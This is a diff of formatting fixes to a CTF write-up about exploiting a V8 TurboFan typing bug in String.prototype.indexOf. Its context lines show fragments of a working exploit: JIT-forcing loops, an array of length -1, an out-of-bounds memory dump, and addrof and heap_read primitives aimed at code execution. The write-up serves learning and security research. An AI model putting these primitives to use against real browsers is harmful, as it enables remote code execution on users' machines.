@@ -12,7 +12,7 @@ attachments: handout.tar.gz
 ```
 I couldn't solve this challenge during live CTF, rather did this later. Big thanks to [@n00bsh1t](https://twitter.com/n00bsh1t) who helped me a lot in understanding this. I mean A LOT!
 
-##Patch
+## Patch
 ```diff
 diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
 index 899922a27f..aea23fe7ea 100644
@@ -49,7 +49,7 @@ The indexOf() method returns the index within the calling String object of the f
 ```
 That means, this is an incorrect assumption made about the range of str.indexOf() method which we are going to exploit in this challenge to gain Arbitrary Code Execution on challenge server.
 
-##POC
+## POC
 First our goal is to gain oob access.
 So here is my thought process:
 ```js
@@ -96,7 +96,7 @@ function oob_read_opt(c) {
 What this does is create an array `evil` with `evil.length = -1`. 
 A  brief explanation about how this works is first we have to make type reducer to convert the type representation to int32_t which is less than 32. Because when the argument to `Array()` is known to be a contant integer less than 16, then the array creation process is inlines by the compiler. You can again refer the Project Zero blog mentioned above to understand how this can be achieved. Now since the evil.length is -1, and bounds check operations are performed as unsigned integers, we can get past the bounds check and access data well beyond the array. And finally implementing the oob_access primitives.
 
-##OOB Access
+## OOB Access
 ```js
 /* Optimize the function oob_read_opt() */
 for (i = 0; i < 0x10000; i++)  oob_read_opt("B");
@@ -116,12 +116,12 @@ for (i = 0; i < 20 ; i++)	print(i + ":\t" + hex(ftoi(leet[i])));
 6:	0x408042205
 7:	0x819217d0821c8b5		<-- elements of obj_arr start here
 8:	0x804222d081c3a41		<-- hidden_map pointer of obj_arr
-9:	0x40821c8c5				<-- elements pointer of obj_arr array
+9:	0x40821c8c5			<-- elements pointer of obj_arr array
 10:	0x408042a95
 11:	0x3ff199999999999a		<-- elements of noob start here
 12:	0x400199999999999a
 13:	0x804222d081c39f1		<-- hidden_map pointer of noob array
-14:	0x40821c8e5				<-- elements pointer of noob array
+14:	0x40821c8e5			<-- elements pointer of noob array
 15:	0x608042205
 16:	0x821c8fd0821c8b5
 17:	0x81c3a410821c8d5
@@ -136,7 +136,7 @@ function addrof(obj) {
   return ftoi(leet[7]) & 0xffffffffn;
 }
 
-function heap_read(addr) {			// addr -> int32_t
+function heap_read(addr) {		// addr -> int32_t
   addr |= 1n;
   addr -= 8n;
   leet[14] = itof((4n << 32n) + addr);
@@ -349,5 +349,7 @@ And we got the flag :)
 
 ## Resources
 [In-the-Wild Series: Chrome Infinity Bug](https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html)
+
 [Circumventing Chrome's hardening of typer bugs](https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs)
+
 [Introduction to TurboFan](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan)
